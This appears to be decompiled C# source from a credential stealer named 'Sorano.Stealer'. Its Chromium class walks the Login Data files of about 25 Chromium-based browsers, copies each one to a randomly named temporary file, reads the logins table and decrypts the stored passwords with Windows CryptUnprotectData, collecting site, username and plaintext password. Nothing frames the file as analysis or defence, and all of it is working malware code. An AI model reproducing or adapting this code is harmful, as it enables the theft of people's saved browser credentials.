using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Sorano.Stealer
{
	// Token: 0x0200000A RID: 10
	internal class Chromium
	{
		// Token: 0x0600001B RID: 27 RVA: 0x00003970 File Offset: 0x00001B70
		public static IEnumerable<PassData> Initialise()
		{
			List<PassData> list = new List<PassData>();
			string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
			string[] array = new string[]
			{
				environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Login Data",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Login Data",
				environmentVariable + "\\Kometa\\User Data\\Default\\Login Data",
				environmentVariable + "\\Orbitum\\User Data\\Default\\Login Data",
				environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Login Data",
				environmentVariable + "\\Amigo\\User\\User Data\\Default\\Login Data",
				environmentVariable + "\\Torch\\User Data\\Default\\Login Data",
				environmentVariable + "\\CentBrowser\\User Data\\Default\\Login Data",
				environmentVariable + "\\Go!\\User Data\\Default\\Login Data",
				environmentVariable + "\\uCozMedia\\Uran\\User Data\\Default\\Login Data",
				environmentVariable + "\\MapleStudio\\ChromePlus\\User Data\\Default\\Login Data",
				environmentVariable + "\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data",
				environmentVariable + "\\BlackHawk\\User Data\\Default\\Login Data",
				environmentVariable + "\\AcWebBrowser\\User Data\\Default\\Login Data",
				environmentVariable + "\\CoolNovo\\User Data\\Default\\Login Data",
				environmentVariable + "\\Epic Browser\\User Data\\Default\\Login Data",
				environmentVariable + "\\Baidu Spark\\User Data\\Default\\Login Data",
				environmentVariable + "\\Rockmelt\\User Data\\Default\\Login Data",
				environmentVariable + "\\Sleipnir\\User Data\\Default\\Login Data",
				environmentVariable + "\\SRWare Iron\\User Data\\Default\\Login Data",
				environmentVariable + "\\Titan Browser\\User Data\\Default\\Login Data",
				environmentVariable + "\\Flock\\User Data\\Default\\Login Data",
				environmentVariable + "\\Vivaldi\\User Data\\Default\\Login Data",
				environmentVariable + "\\Sputnik\\User Data\\Default\\Login Data",
				environmentVariable + "\\Maxthon\\User Data\\Default\\Login Data"
			};
			foreach (string basePath in array)
			{
				List<PassData> list2 = new List<PassData>();
				try
				{
					list2 = Chromium.Get(basePath);
				}
				catch
				{
				}
				bool flag = list2 != null;
				if (flag)
				{
					list.AddRange(list2);
				}
			}
			return list;
		}

		// Token: 0x0600001C RID: 28
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref Chromium.DataBlob pCipherText, ref string pszDescription, ref Chromium.DataBlob pEntropy, IntPtr pReserved, ref Chromium.CryptprotectPromptstruct pPrompt, int dwFlags, ref Chromium.DataBlob pPlainText);

		// Token: 0x0600001D RID: 29 RVA: 0x00003B74 File Offset: 0x00001D74
		public static byte[] DecryptChromium(byte[] cipherTextBytes, byte[] entropyBytes = null)
		{
			Chromium.DataBlob dataBlob = default(Chromium.DataBlob);
			Chromium.DataBlob dataBlob2 = default(Chromium.DataBlob);
			Chromium.DataBlob dataBlob3 = default(Chromium.DataBlob);
			Chromium.CryptprotectPromptstruct cryptprotectPromptstruct = new Chromium.CryptprotectPromptstruct
			{
				cbSize = Marshal.SizeOf(typeof(Chromium.CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					bool flag = cipherTextBytes == null;
					if (flag)
					{
						cipherTextBytes = new byte[0];
					}
					dataBlob2.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
					dataBlob2.cbData = cipherTextBytes.Length;
					Marshal.Copy(cipherTextBytes, 0, dataBlob2.pbData, cipherTextBytes.Length);
				}
				catch (Exception)
				{
				}
				try
				{
					bool flag2 = entropyBytes == null;
					if (flag2)
					{
						entropyBytes = new byte[0];
					}
					dataBlob3.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
					dataBlob3.cbData = entropyBytes.Length;
					Marshal.Copy(entropyBytes, 0, dataBlob3.pbData, entropyBytes.Length);
				}
				catch (Exception)
				{
				}
				Chromium.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
				byte[] array = new byte[dataBlob.cbData];
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
				return array;
			}
			catch (Exception)
			{
			}
			finally
			{
				bool flag3 = dataBlob.pbData != IntPtr.Zero;
				if (flag3)
				{
					Marshal.FreeHGlobal(dataBlob.pbData);
				}
				bool flag4 = dataBlob2.pbData != IntPtr.Zero;
				if (flag4)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				bool flag5 = dataBlob3.pbData != IntPtr.Zero;
				if (flag5)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return new byte[0];
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00003D68 File Offset: 0x00001F68
		private static List<PassData> Get(string basePath)
		{
			bool flag = !File.Exists(basePath);
			List<PassData> result;
			if (flag)
			{
				result = null;
			}
			else
			{
				bool flag2 = basePath.Contains("Chrome");
				if (flag2)
				{
				}
				bool flag3 = basePath.Contains("Yandex");
				if (flag3)
				{
				}
				bool flag4 = basePath.Contains("Orbitum");
				if (flag4)
				{
				}
				bool flag5 = basePath.Contains("Opera");
				if (flag5)
				{
				}
				bool flag6 = basePath.Contains("Amigo");
				if (flag6)
				{
				}
				bool flag7 = basePath.Contains("Torch");
				if (flag7)
				{
				}
				bool flag8 = basePath.Contains("Comodo");
				if (flag8)
				{
				}
				bool flag9 = basePath.Contains("CentBrowser");
				if (flag9)
				{
				}
				bool flag10 = basePath.Contains("Go!");
				if (flag10)
				{
				}
				bool flag11 = basePath.Contains("uCozMedia");
				if (flag11)
				{
				}
				bool flag12 = basePath.Contains("MapleStudio");
				if (flag12)
				{
				}
				bool flag13 = basePath.Contains("BlackHawk");
				if (flag13)
				{
				}
				bool flag14 = basePath.Contains("CoolNovo");
				if (flag14)
				{
				}
				bool flag15 = basePath.Contains("Vivaldi");
				if (flag15)
				{
				}
				bool flag16 = basePath.Contains("Sputnik");
				if (flag16)
				{
				}
				bool flag17 = basePath.Contains("Maxthon");
				if (flag17)
				{
				}
				bool flag18 = basePath.Contains("AcWebBrowser");
				if (flag18)
				{
				}
				bool flag19 = basePath.Contains("Epic Browser");
				if (flag19)
				{
				}
				bool flag20 = basePath.Contains("Baidu Spark");
				if (flag20)
				{
				}
				bool flag21 = basePath.Contains("Rockmelt");
				if (flag21)
				{
				}
				bool flag22 = basePath.Contains("Sleipnir");
				if (flag22)
				{
				}
				bool flag23 = basePath.Contains("SRWare Iron");
				if (flag23)
				{
				}
				bool flag24 = basePath.Contains("Titan Browser");
				if (flag24)
				{
				}
				bool flag25 = basePath.Contains("Flock");
				if (flag25)
				{
				}
				List<PassData> list2;
				try
				{
					string text = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
					bool flag26 = File.Exists(text);
					if (flag26)
					{
						File.Delete(text);
					}
					File.Copy(basePath, text, true);
					Sqlite sqlite = new Sqlite(text);
					List<PassData> list = new List<PassData>();
					sqlite.ReadTable("logins");
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						try
						{
							string text2 = string.Empty;
							try
							{
								byte[] bytes = Chromium.DecryptChromium(Encoding.Default.GetBytes(sqlite.GetValue(i, 5)), null);
								text2 = Encoding.UTF8.GetString(bytes);
							}
							catch (Exception)
							{
							}
							bool flag27 = text2 != "";
							if (flag27)
							{
								list.Add(new PassData
								{
									Url = sqlite.GetValue(i, 1).Replace("https://", "").Replace("http://", ""),
									Login = sqlite.GetValue(i, 3),
									Password = text2,
									Program = Chromium.program
								});
							}
						}
						catch (Exception ex)
						{
							Console.WriteLine(ex.ToString());
						}
					}
					File.Delete(text);
					list2 = list;
				}
				catch (Exception ex2)
				{
					Console.WriteLine(ex2.ToString());
					list2 = null;
				}
				result = list2;
			}
			return result;
		}

		// Token: 0x0400000C RID: 12
		private static string program;

		// Token: 0x0200000B RID: 11
		private struct CryptprotectPromptstruct
		{
			// Token: 0x0400000D RID: 13
			public int cbSize;

			// Token: 0x0400000E RID: 14
			public int dwPromptFlags;

			// Token: 0x0400000F RID: 15
			public IntPtr hwndApp;

			// Token: 0x04000010 RID: 16
			public string szPrompt;
		}

		// Token: 0x0200000C RID: 12
		private struct DataBlob
		{
			// Token: 0x04000011 RID: 17
			public int cbData;

			// Token: 0x04000012 RID: 18
			public IntPtr pbData;
		}
	}
}
